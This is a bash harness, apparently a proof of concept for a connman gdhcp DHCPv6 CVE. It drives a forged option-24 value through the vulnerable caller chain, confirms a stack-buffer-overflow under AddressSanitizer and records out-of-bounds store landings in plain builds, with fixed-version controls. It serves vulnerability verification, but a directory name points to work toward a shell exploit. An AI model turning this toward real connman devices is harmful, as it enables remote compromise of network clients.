#!/bin/bash
# CVE-2026-115863 — caller-chain harness.
# Extracts three verbatim functions from pinned tag-2.0 gdhcp/client.c,
# asserts SHA-256, drives get_dhcpv6_request() with a forged REPLY option-24
# value (len 2048), and reports ASan reachability + plain-build store landing.
# No connman build, no DHCPv6 socket, no daemon, no network.
# Stubs intentionally do not free the returned GLists; LSan noise would
# otherwise mask the clean-input controls. ASan bounds checks stay enabled.
export ASAN_OPTIONS=detect_leaks=0
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E"
rm -f "$E"/*.log "$E"/*.out get_domains_fn.inc get_ov_list_fn.inc get_request_fn.inc \
      a-chain a-fixed p-chain
PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi; }
hasnt() { if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi; }
srcsha() { sha256sum "$1" | cut -d' ' -f1; }
SRC=../../frontier/connman2shell/src/client-2.0.c
FIX=../../frontier/connman2shell/src/client-2.0-fixed.c

[ "$(srcsha "$SRC")" = 722cccc072d658f6c9fded507e1deab8cd8a8837479c9215c88a4834f81fcb0f ] \
  && ok "pin-2.0-source-sha256" || no "pin-2.0-source-sha256"
[ "$(srcsha "$FIX")" = d252cf019c960a3a9a60501429155cead2876269c79ab1cca7443b787f3c5c0e ] \
  && ok "fixed-source-sha256" || no "fixed-source-sha256"
[ "$(srcsha driver.c)" = 23b011396c3554a20bdea6474fb74511cb08fb1ba24d4d1420a0214a884abdc3 ] \
  && ok "driver-sha256" || no "driver-sha256"

extract() { sed -n "/^$2/p" "$1"; }
# Verbatim extracts: range end is the first '}' at column 0 after the opener.
ext() { sed -n "$2" "$1"; }
ext "$SRC" '/^static GList \*get_domains/,/^}/p' > /tmp/c2-domains.inc
ext "$SRC" '/^static GList \*get_dhcpv6_option_value_list/,/^}/p' > /tmp/c2-ov.inc
ext "$SRC" '/^static void get_dhcpv6_request/,/^}/p' > /tmp/c2-req.inc
ext "$FIX" '/^static GList \*get_domains/,/^}/p' > /tmp/c2f-domains.inc
ext "$FIX" '/^static GList \*get_dhcpv6_option_value_list/,/^}/p' > /tmp/c2f-ov.inc
ext "$FIX" '/^static void get_dhcpv6_request/,/^}/p' > /tmp/c2f-req.inc

[ "$(srcsha /tmp/c2-domains.inc)" = 090d8ea201196ea32892c95aaeb38d5b2a99c9a8ef41c4d081782b8a6f60a5c2 ] \
  && ok "verbatim-vuln-get_domains-sha256" || no "verbatim-vuln-get_domains-sha256"
[ "$(srcsha /tmp/c2-ov.inc)" = 0391d8e708902132249ce7e31d1d20bb6cecca7e029b09c9658a7a1950497414 ] \
  && ok "verbatim-get_ov_list-sha256" || no "verbatim-get_ov_list-sha256"
[ "$(srcsha /tmp/c2-req.inc)" = b38eb6989a74b6dd81465a87a61afe700df24ecea6c90153a6f9e4acf2d4f812 ] \
  && ok "verbatim-get_request-sha256" || no "verbatim-get_request-sha256"
[ "$(srcsha /tmp/c2f-domains.inc)" = 466360babe68e0cdf7abfa8d5e20c5dd7ad7bea05631ecf0f39f8f531241b0d9 ] \
  && ok "verbatim-fixed-get_domains-sha256" || no "verbatim-fixed-get_domains-sha256"
[ "$(srcsha /tmp/c2f-ov.inc)" = 0391d8e708902132249ce7e31d1d20bb6cecca7e029b09c9658a7a1950497414 ] \
  && ok "verbatim-fixed-get_ov_list-sha256" || no "verbatim-fixed-get_ov_list-sha256"
[ "$(srcsha /tmp/c2f-req.inc)" = b38eb6989a74b6dd81465a87a61afe700df24ecea6c90153a6f9e4acf2d4f812 ] \
  && ok "verbatim-fixed-get_request-sha256" || no "verbatim-fixed-get_request-sha256"

CFLAGS="-g -O0 -fno-omit-frame-pointer -fsanitize=address"
build() { # out, domains-inc, ov-inc, req-inc, extra
	cp "$2" get_domains_fn.inc
	cp "$3" get_ov_list_fn.inc
	cp "$4" get_request_fn.inc
	# shellcheck disable=SC2086
	gcc $CFLAGS ${5:-} -w driver.c -o "$1" 2>"$E/build-$1.log"
	return $?
}
build a-chain /tmp/c2-domains.inc /tmp/c2-ov.inc /tmp/c2-req.inc \
  && ok "build-chain-asan" || no "build-chain-asan"
build a-fixed /tmp/c2f-domains.inc /tmp/c2f-ov.inc /tmp/c2f-req.inc \
  && ok "build-fixed-asan" || no "build-fixed-asan"

cp /tmp/c2-domains.inc get_domains_fn.inc
cp /tmp/c2-ov.inc get_ov_list_fn.inc
cp /tmp/c2-req.inc get_request_fn.inc
gcc -g -O0 -fno-omit-frame-pointer -DPLAIN -w driver.c -o p-chain \
  2>"$E/build-p-chain.log" && ok "build-chain-plain" || no "build-chain-plain"

# --- reachability: ASan attack through the real caller chain ---------------
./a-chain attack 0x80 >"$E/chain-asan-attack.out" 2>&1; RC=$?
f="$E/chain-asan-attack.out"
[ "$RC" -ne 0 ] && ok "chain-asan-nonzero-exit" || no "chain-asan-nonzero-exit"
has "$f" "ERROR: AddressSanitizer: stack-buffer-overflow" "chain-asan-stack-overflow"
has "$f" "READ of size 1" "chain-asan-read-1"
has "$f" "get_domains" "chain-frame-get_domains"
has "$f" "get_dhcpv6_option_value_list" "chain-frame-get_ov_list"
has "$f" "get_dhcpv6_request" "chain-frame-get_request"
has "$f" "CHAIN USEDLEN=2048 LASTJUMP=80" "chain-crafted-input-reaches-option24"

# --- controls: fixed pin and safe DOMAIN_LIST via the same chain -----------
./a-fixed attack 0x80 >"$E/fixed-asan-attack.out" 2>&1; FRC=$?
has "$E/fixed-asan-attack.out" "CHAIN DONE STATUS=0" "fixed-chain-clean-done"
hasnt "$E/fixed-asan-attack.out" "AddressSanitizer" "fixed-chain-no-asan"
[ "$FRC" -eq 0 ] && ok "fixed-chain-clean-exit" || no "fixed-chain-clean-exit"

./a-chain safe >"$E/chain-asan-safe.out" 2>&1; SRC_RC=$?
has "$E/chain-asan-safe.out" "CHAIN DONE STATUS=0" "vuln-chain-safe-clean-done"
hasnt "$E/chain-asan-safe.out" "AddressSanitizer" "vuln-chain-safe-no-asan"
[ "$SRC_RC" -eq 0 ] && ok "vuln-chain-safe-clean-exit" || no "vuln-chain-safe-clean-exit"

# --- store landing: plain build, natural caller chain, 12 repetitions ------
# After the first attacker-chosen OOB step the walk reads ambient stack bytes
# for its next stride, so the continuation is ASLR-dependent. Record all
# observed outcomes rather than requiring one canonical result.
store=0; none=0; crash=0
for n in $(seq 1 12); do
	./p-chain 0x80 >"$E/chain-plain-$n.out" 2>&1; PRC=$?
	f="$E/chain-plain-$n.out"
	has "$f" "PLAIN LASTJUMP=80" "chain-plain-$n-crafted-input"
	if [ "$PRC" -ne 0 ]; then
		crash=$((crash + 1))
		printf 'OBS plain-%02d exit=%d CRASH\n' "$n" "$PRC"
	elif grep -q "CANARY DOTS=0 " "$f"; then
		none=$((none + 1))
		printf 'OBS plain-%02d exit=%d NO_CANARY_WRITES %s\n' "$n" "$PRC" \
		  "$(grep -oE 'FILLBASE=[^ ]+ REQ_RBP=[^ ]+' "$f")"
	elif grep -q "CANARY DOTS=" "$f"; then
		store=$((store + 1))
		printf 'OBS plain-%02d exit=%d STORE %s\n' "$n" "$PRC" \
		  "$(grep -oE 'DOTS=[0-9]+ FIRST=[0-9]+ LAST=[0-9]+' "$f")"
	else
		no "chain-plain-$n-unclassified-outcome"
	fi
done
printf 'PLAIN_OUTCOMES store=%d none=%d crash=%d total=12\n' "$store" "$none" "$crash"
[ "$store" -gt 0 ] && ok "plain-store-outcome-observed" || no "plain-store-outcome-observed"
[ "$crash" -gt 0 ] && ok "plain-crash-outcome-observed" || no "plain-crash-outcome-observed"

printf 'SUMMARY=%d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
